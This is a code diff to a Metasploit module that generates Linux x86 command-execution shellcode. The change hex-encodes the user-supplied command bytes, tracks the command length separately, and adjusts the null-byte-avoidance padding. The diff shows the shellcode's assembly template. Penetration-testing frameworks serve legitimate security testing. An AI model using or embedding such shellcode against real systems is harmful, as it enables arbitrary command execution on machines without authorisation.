@@ -52,6 +52,8 @@ module MetasploitModule
 
   def generate(_opts = {})
     cmd = datastore['CMD'] || ''
+    cmd_length = cmd.bytesize
+    cmd = cmd.bytes.map { |byte| '0x%02x' % byte }.join(', ')
     nullfreeversion = datastore['NullFreeVersion']
     if cmd.empty?
       #
@@ -89,19 +91,20 @@ module MetasploitModule
       #
       pushw_c_opt = 'dd 0x632d6866' # pushw 0x632d (metasm doesn't support pushw)
       if nullfreeversion
-        if cmd.length > 0xffff
+        if cmd_length > 0xffff
           raise RangeError, 'CMD length has to be smaller than %d' % 0xffff, caller
         end
 
-        if cmd.length <= 0xff # 255
+        if cmd_length <= 0xff # 255
           breg = 'bl'
         else
           breg = 'bx'
-          if (cmd.length & 0xff) == 0 # let's avoid zeroed bytes
-            cmd += ' '
+          if (cmd_length & 0xff) == 0 # let's avoid zeroed bytes
+            cmd += ', 0x20'
+            cmd_length += 1
           end
         end
-        mov_cmd_len_to_breg = "mov #{breg}, #{cmd.length}"
+        mov_cmd_len_to_breg = "mov #{breg}, #{cmd_length}"
         # 47/49 bytes without cmd (null-free)
         payload = <<-EOS
             xor ebx, ebx
@@ -127,7 +130,7 @@ module MetasploitModule
             int 0x80
           tocall:
             call afterjmp          ; call/pop cmd address
-            db "#{cmd}"
+            db #{cmd}
         EOS
       else
         # 36 bytes without cmd (not null-free)
@@ -143,7 +146,7 @@ module MetasploitModule
             mov ebx, esp
             push edx
             call continue
-            db "#{cmd}", 0x00
+            db #{cmd}, 0x00
           continue:
             push edi
             push ebx
